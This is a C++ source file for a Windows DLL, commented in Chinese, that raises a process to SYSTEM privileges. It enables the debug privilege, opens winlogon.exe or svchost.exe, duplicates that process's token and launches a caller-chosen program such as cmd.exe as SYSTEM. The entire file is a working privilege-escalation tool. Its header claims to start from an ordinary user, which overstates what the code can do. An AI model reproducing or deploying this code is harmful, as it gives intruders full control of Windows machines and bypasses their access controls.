// Windows系统提权DLL - 从普通用户权限提升到SYSTEM权限
// 作者：cutecuteyu
// 创建时间：2025年
// DLL版本：1.0

// Windows API头文件 - 提供Windows系统调用接口
#include <windows.h>        // 核心Windows API
#include <iostream>         // 标准输入输出流
#include <string>           // 字符串处理
#include <tlhelp32.h>       // 进程快照和枚举功能
#include <psapi.h>          // 进程状态API
#include <locale>           // 本地化设置（解决中文乱码）
#include <codecvt>          // 字符编码转换

// 链接Windows安全API库 - 提供权限管理功能
#pragma comment(lib, "advapi32.lib")

// ==================== DLL导出定义 ====================

// 编译DLL时自动定义BUILD_DLL宏
#ifndef BUILD_DLL
#define BUILD_DLL
#endif

#ifdef BUILD_DLL
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT __declspec(dllimport)
#endif

// ==================== 函数声明区域 ====================

// 启用调试权限 - 允许程序调试其他进程
BOOL EnableDebugPrivilege();

// 查找SYSTEM权限的进程 - 寻找以SYSTEM权限运行的进程
DWORD FindSvchostPID();

// 获取SYSTEM令牌 - 从目标进程提取安全令牌
HANDLE GetSystemToken(DWORD pid);

// 使用令牌创建进程 - 使用SYSTEM令牌创建新进程（内部函数）
BOOL CreateProcessWithTokenInternal(HANDLE token, const wchar_t* processName);

// ==================== DLL导出函数 ====================

/**
 * DLL入口点函数
 */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // DLL被加载到进程时调用
            break;
        case DLL_THREAD_ATTACH:
            // 新线程创建时调用
            break;
        case DLL_THREAD_DETACH:
            // 线程结束时调用
            break;
        case DLL_PROCESS_DETACH:
            // DLL从进程卸载时调用
            break;
    }
    return TRUE;
}

/**
 * 提权到SYSTEM权限并创建指定进程
 * @param processName 要创建的进程名称（如L"cmd.exe"）
 * @return 0表示成功，非0表示失败
 */
extern "C" DLL_EXPORT int EscalateToSystemAndCreateProcess(const wchar_t* processName);

// ==================== 辅助函数实现 ====================

/**
 * 宽字符输出函数 - 专门解决Windows控制台中文乱码问题
 * @param message 要输出的宽字符串（Unicode）
 * @note 使用WriteConsoleW直接写入控制台，避免编码转换问题
 */
void PrintMessage(const wchar_t* message) {
    DWORD written;  // 实际写入的字符数
    
    // 使用WriteConsoleW直接输出宽字符到控制台
    WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), message, wcslen(message), &written, NULL);
    
    // 输出换行符
    WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), L"\n", 1, &written, NULL);
}

/**
 * 提权到SYSTEM权限并创建指定进程
 * @param processName 要创建的进程名称（如L"cmd.exe"）
 * @return 0表示成功，非0表示失败
 */
extern "C" DLL_EXPORT int EscalateToSystemAndCreateProcess(const wchar_t* processName) {
    // ==================== 第一步：设置中文环境 ====================
    
    // 设置控制台输出编码为UTF-8 - 解决中文显示乱码问题
    SetConsoleOutputCP(CP_UTF8);
    // 设置控制台输入编码为UTF-8 - 确保输入也能正确处理中文
    SetConsoleCP(CP_UTF8);
    
    // 设置程序本地化环境 - 使用异常处理确保程序稳定性
    try {
        // 使用系统默认locale - 自动适配当前系统的语言设置
        std::locale::global(std::locale(""));
    } catch (const std::exception& e) {
        // 如果设置locale失败（如系统不支持指定locale），使用C locale作为后备
        // C locale是标准C库的默认locale，兼容性最好
        std::locale::global(std::locale("C"));
    }
    
    // 输出程序开始提示信息
    PrintMessage(L"[*] 开始提权到SYSTEM权限...");
    
    // ==================== 第二步：启用调试权限 ====================
    
    // 启用SE_DEBUG_NAME权限 - 这是提权的关键步骤
    // 调试权限允许程序调试其他进程，包括获取它们的令牌
    if (!EnableDebugPrivilege()) {
        PrintMessage(L"[!] 启用调试权限失败");
        return 1;  // 返回错误代码1：权限启用失败
    }
    PrintMessage(L"[+] 调试权限已启用");
    
    // ==================== 第三步：查找SYSTEM权限进程 ====================
    
    // 查找以SYSTEM权限运行的进程（优先查找winlogon.exe，其次svchost.exe）
    DWORD svchostPID = FindSvchostPID();
    if (svchostPID == 0) {
        PrintMessage(L"[!] 未找到SYSTEM权限的进程");
        return 1;  // 返回错误代码1：找不到目标进程
    }
    
    // 格式化并输出找到的进程信息
    wchar_t pidMsg[100];  // 缓冲区存储格式化后的消息
    swprintf(pidMsg, 100, L"[+] 找到SYSTEM进程，PID: %lu", svchostPID);
    PrintMessage(pidMsg);
    
    // ==================== 第四步：获取SYSTEM令牌 ====================
    
    // 从目标进程获取SYSTEM安全令牌
    HANDLE systemToken = GetSystemToken(svchostPID);
    if (systemToken == NULL) {
        PrintMessage(L"[!] 获取SYSTEM令牌失败");
        return 1;  // 返回错误代码1：令牌获取失败
    }
    PrintMessage(L"[+] 成功获取SYSTEM令牌");
    
    // ==================== 第五步：创建SYSTEM权限进程 ====================
    
    // 使用获取的SYSTEM令牌创建指定的进程
    if (!CreateProcessWithTokenInternal(systemToken, processName)) {
        PrintMessage(L"[!] 创建进程失败");
        CloseHandle(systemToken);  // 释放令牌句柄
        return 1;  // 返回错误代码1：进程创建失败
    }
    
    // ==================== 第六步：清理资源并退出 ====================
    
    // 释放SYSTEM令牌句柄 - 防止资源泄漏
    CloseHandle(systemToken);
    
    // 输出成功提示信息
    wchar_t successMsg[256];
    swprintf(successMsg, 256, L"[+] 提权成功！已打开SYSTEM权限的%s窗口", processName);
    PrintMessage(successMsg);
    
    // 函数正常退出
    return 0;  // 返回0表示程序执行成功
}

/**
 * 启用调试权限 - 为当前进程启用SE_DEBUG_NAME权限
 * @return TRUE表示成功，FALSE表示失败
 * @note SE_DEBUG_NAME权限允许程序调试其他进程，这是提权的关键前提
 */
BOOL EnableDebugPrivilege() {
    HANDLE hToken;           // 当前进程的令牌句柄
    TOKEN_PRIVILEGES tkp;    // 令牌权限结构
    
    // 打开当前进程的令牌 - 需要调整权限和查询权限
    // TOKEN_ADJUST_PRIVILEGES: 允许修改令牌权限
    // TOKEN_QUERY: 允许查询令牌信息
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;  // 打开令牌失败
    }
    
    // 查找SE_DEBUG_NAME权限对应的LUID（本地唯一标识符）
    // SE_DEBUG_NAME: 调试权限，允许调试其他进程
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
    
    // 设置权限结构
    tkp.PrivilegeCount = 1;  // 只修改一个权限
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  // 启用该权限
    
    // 调整令牌权限 - 实际启用调试权限
    // FALSE: 不禁用所有权限
    // &tkp: 新的权限设置
    // 0, NULL, NULL: 不需要返回之前的权限状态
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
    
    // 关闭令牌句柄 - 防止资源泄漏
    CloseHandle(hToken);
    
    // 检查权限调整是否成功
    // GetLastError()返回ERROR_SUCCESS表示成功
    return GetLastError() == ERROR_SUCCESS;
}

/**
 * 查找SYSTEM权限的进程 - 枚举系统进程并寻找合适的SYSTEM权限进程
 * @return 找到的进程PID，0表示未找到
 * @note 优先查找winlogon.exe，其次查找svchost.exe
 *       winlogon.exe通常以SYSTEM权限运行且更容易访问
 */
DWORD FindSvchostPID() {
    HANDLE hProcessSnap;      // 进程快照句柄
    PROCESSENTRY32 pe32;      // 进程条目结构
    DWORD pid = 0;           // 找到的进程PID，初始为0表示未找到
    
    // 创建系统进程快照 - TH32CS_SNAPPROCESS表示获取进程列表
    // 0表示当前进程（快照不包含特定进程的信息）
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;  // 快照创建失败
    }
    
    // 设置进程条目结构的大小 - 这是必需的初始化步骤
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    // 获取快照中的第一个进程 - 如果失败则清理资源并返回
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);  // 关闭快照句柄
        return 0;  // 枚举第一个进程失败
    }
    
    // 遍历所有进程，寻找SYSTEM权限的进程
    do {
        // 优先查找winlogon.exe进程 - Windows登录管理器，通常以SYSTEM权限运行
        // winlogon.exe比svchost.exe更容易访问，权限检查更宽松
        if (strcmp(pe32.szExeFile, "winlogon.exe") == 0) {
            pid = pe32.th32ProcessID;  // 记录进程PID
            break;  // 找到winlogon.exe，立即退出循环
        }
        // 如果找不到winlogon.exe，再尝试查找svchost.exe
        // 条件pid == 0确保只记录第一个找到的svchost.exe
        else if (strcmp(pe32.szExeFile, "svchost.exe") == 0 && pid == 0) {
            pid = pe32.th32ProcessID;  // 记录进程PID
            // 不break，继续查找可能的winlogon.exe
        }
    } while (Process32Next(hProcessSnap, &pe32));  // 继续枚举下一个进程
    
    // 关闭进程快照句柄 - 防止资源泄漏
    CloseHandle(hProcessSnap);
    
    // 返回找到的进程PID（如果未找到则返回0）
    return pid;
}

/**
 * 获取SYSTEM令牌 - 从目标进程提取安全令牌
 * @param pid 目标进程的PID
 * @return SYSTEM令牌句柄，NULL表示失败
 * @note 使用渐进式权限申请策略，从最小权限到完全权限
 */
HANDLE GetSystemToken(DWORD pid) {
    HANDLE hProcess = NULL;       // 目标进程句柄
    HANDLE hToken = NULL;         // 原始令牌句柄
    HANDLE hSystemToken = NULL;   // 复制的SYSTEM令牌句柄
    
    // ==================== 第一步：打开目标进程 ====================
    
    // 首先尝试使用最小权限打开进程 - 兼容性最好，安全性最高
    // PROCESS_QUERY_LIMITED_INFORMATION: 有限查询权限，Windows Vista及以上支持
    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) {
        // 如果最小权限失败，尝试标准查询权限 - Windows 2000及以上支持
        // PROCESS_QUERY_INFORMATION: 标准查询权限
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProcess) {
            // 最后尝试完全访问权限 - 最高权限，但可能被系统拒绝
            // PROCESS_ALL_ACCESS: 所有可能的访问权限
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (!hProcess) {
                // 所有权限尝试都失败，输出详细错误信息
                DWORD error = GetLastError();
                wchar_t errorMsg[256];
                swprintf(errorMsg, 256, L"[!] OpenProcess失败，错误代码: %lu", error);
                PrintMessage(errorMsg);
                return NULL;  // 返回NULL表示进程打开失败
            }
        }
    }
    
    // ==================== 第二步：打开进程令牌 ====================
    
    // 尝试打开进程的安全令牌 - 使用最小必要权限组合
    // TOKEN_DUPLICATE: 允许复制令牌
    // TOKEN_QUERY: 允许查询令牌信息
    // TOKEN_IMPERSONATE: 允许模拟令牌
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hToken)) {
        DWORD error = GetLastError();
        wchar_t errorMsg[256];
        swprintf(errorMsg, 256, L"[!] OpenProcessToken失败，错误代码: %lu", error);
        PrintMessage(errorMsg);
        CloseHandle(hProcess);  // 关闭进程句柄
        return NULL;  // 返回NULL表示令牌打开失败
    }
    
    // ==================== 第三步：复制SYSTEM令牌 ====================
    
    // 复制原始令牌创建新的SYSTEM令牌 - 使用模拟级别而非主令牌
    // MAXIMUM_ALLOWED: 请求所有可用的访问权限
    // SecurityImpersonation: 安全模拟级别
    // TokenImpersonation: 创建模拟令牌（比主令牌更容易使用）
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hSystemToken)) {
        DWORD error = GetLastError();
        wchar_t errorMsg[256];
        swprintf(errorMsg, 256, L"[!] DuplicateTokenEx失败，错误代码: %lu", error);
        PrintMessage(errorMsg);
        CloseHandle(hToken);     // 关闭原始令牌句柄
        CloseHandle(hProcess);  // 关闭进程句柄
        return NULL;  // 返回NULL表示令牌复制失败
    }
    
    // ==================== 第四步：清理资源 ====================
    
    // 关闭不再需要的句柄，防止资源泄漏
    CloseHandle(hToken);     // 关闭原始令牌句柄
    CloseHandle(hProcess);  // 关闭进程句柄
    
    // 返回复制的SYSTEM令牌句柄
    return hSystemToken;
}

/**
 * 使用令牌创建SYSTEM权限的指定进程 - 多级进程创建策略
 * @param token 目标令牌句柄（通常是SYSTEM令牌）
 * @param processName 要创建的进程名称
 * @return TRUE表示成功创建进程，FALSE表示失败
 * @note 采用多级创建策略：
 *       1. 首先模拟令牌（ImpersonateLoggedOnUser）
 *       2. 尝试使用CreateProcessWithTokenW创建进程
 *       3. 如果失败，降级使用CreateProcessAsUserW
 *       4. 使用CreateProcessAsUserW需要先将模拟令牌转换为主令牌
 */
BOOL CreateProcessWithTokenInternal(HANDLE token, const wchar_t* processName) {
    STARTUPINFOW si;          // 进程启动信息结构
    PROCESS_INFORMATION pi;   // 进程信息结构
    
    // ==================== 第一步：初始化进程启动信息 ====================
    
    // 清零启动信息结构 - 确保没有未初始化的数据
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);  // 设置结构大小，这是必需的
    
    // 清零进程信息结构 - 准备接收新进程的信息
    ZeroMemory(&pi, sizeof(pi));
    
    // ==================== 第二步：模拟令牌身份 ====================
    
    // 首先模拟令牌身份 - 将当前线程的安全上下文设置为令牌的上下文
    // ImpersonateLoggedOnUser允许当前线程以令牌所有者的身份执行操作
    if (!ImpersonateLoggedOnUser(token)) {
        DWORD error = GetLastError();  // 获取错误代码
        wchar_t errorMsg[256];         // 错误消息缓冲区
        swprintf(errorMsg, 256, L"[!] ImpersonateLoggedOnUser失败，错误代码: %lu", error);
        PrintMessage(errorMsg);  // 输出错误信息
        return FALSE;  // 模拟失败，直接返回
    }
    
    // ==================== 第三步：使用CreateProcessWithTokenW创建进程 ====================
    
    // 构建命令行参数 - 使用动态分配的缓冲区
    size_t cmdLineSize = wcslen(processName) + 10;
    wchar_t* cmdLine = new wchar_t[cmdLineSize];
    swprintf(cmdLine, cmdLineSize, L"%s", processName);
    
    // 尝试使用令牌创建进程 - 这是最直接的方法
    // token: 要使用的令牌句柄
    // LOGON_WITH_PROFILE: 使用用户配置文件登录
    // NULL: 不使用应用程序名称
    // cmdLine: 命令行参数
    // CREATE_NEW_CONSOLE: 创建新的控制台窗口
    // NULL, NULL: 使用当前进程的环境变量和当前目录
    // &si, &pi: 启动信息和进程信息结构
    if (!CreateProcessWithTokenW(token, LOGON_WITH_PROFILE, NULL, cmdLine, 
                                CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        DWORD error = GetLastError();  // 获取错误代码
        wchar_t errorMsg[256];         // 错误消息缓冲区
        swprintf(errorMsg, 256, L"[!] CreateProcessWithTokenW失败，错误代码: %lu", error);
        PrintMessage(errorMsg);  // 输出错误信息
        
        // 清理命令行缓冲区
        delete[] cmdLine;
        
        // ==================== 第四步：降级使用CreateProcessAsUserW ====================
        
        // 恢复当前线程的原始安全上下文 - 撤销模拟
        RevertToSelf();
        
        // 首先需要将模拟令牌转换为主令牌 - CreateProcessAsUserW需要主令牌
        HANDLE hPrimaryToken;  // 主令牌句柄
        if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
            error = GetLastError();  // 获取错误代码
            swprintf(errorMsg, 256, L"[!] 转换为主令牌失败，错误代码: %lu", error);
            PrintMessage(errorMsg);  // 输出错误信息
            return FALSE;  // 令牌转换失败
        }
        
        // 重新构建命令行参数
        wchar_t* cmdLine2 = new wchar_t[cmdLineSize];
        swprintf(cmdLine2, cmdLineSize, L"%s", processName);
        
        // 使用主令牌创建进程 - 这是备选方案
        // hPrimaryToken: 主令牌句柄
        // NULL: 不使用应用程序名称
        // cmdLine2: 命令行参数
        // NULL, NULL: 不设置进程和线程安全描述符
        // FALSE: 不继承句柄
        // CREATE_NEW_CONSOLE: 创建新的控制台窗口
        // NULL, NULL: 使用当前进程的环境变量和当前目录
        // &si, &pi: 启动信息和进程信息结构
        if (!CreateProcessAsUserW(hPrimaryToken, NULL, cmdLine2, NULL, NULL, FALSE, 
                                CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            error = GetLastError();  // 获取错误代码
            swprintf(errorMsg, 256, L"[!] CreateProcessAsUser失败，错误代码: %lu", error);
            PrintMessage(errorMsg);  // 输出错误信息
            CloseHandle(hPrimaryToken);  // 关闭主令牌句柄
            delete[] cmdLine2;  // 清理命令行缓冲区
            return FALSE;  // 进程创建失败
        }
        
        // 关闭主令牌句柄 - 防止资源泄漏
        CloseHandle(hPrimaryToken);
        delete[] cmdLine2;  // 清理命令行缓冲区
    } else {
        // 清理命令行缓冲区
        delete[] cmdLine;
    }
    
    // ==================== 第五步：成功处理 ====================
    
    // 输出成功信息
    wchar_t successMsg[256];
    swprintf(successMsg, 256, L"[+] SYSTEM权限的%s进程已创建", processName);
    PrintMessage(successMsg);
    
    // 关闭进程和线程句柄 - 防止资源泄漏
    // 虽然进程仍在运行，但不再需要这些句柄
    CloseHandle(pi.hProcess);  // 关闭进程句柄
    CloseHandle(pi.hThread);   // 关闭主线程句柄
    
    return TRUE;  // 返回成功状态
}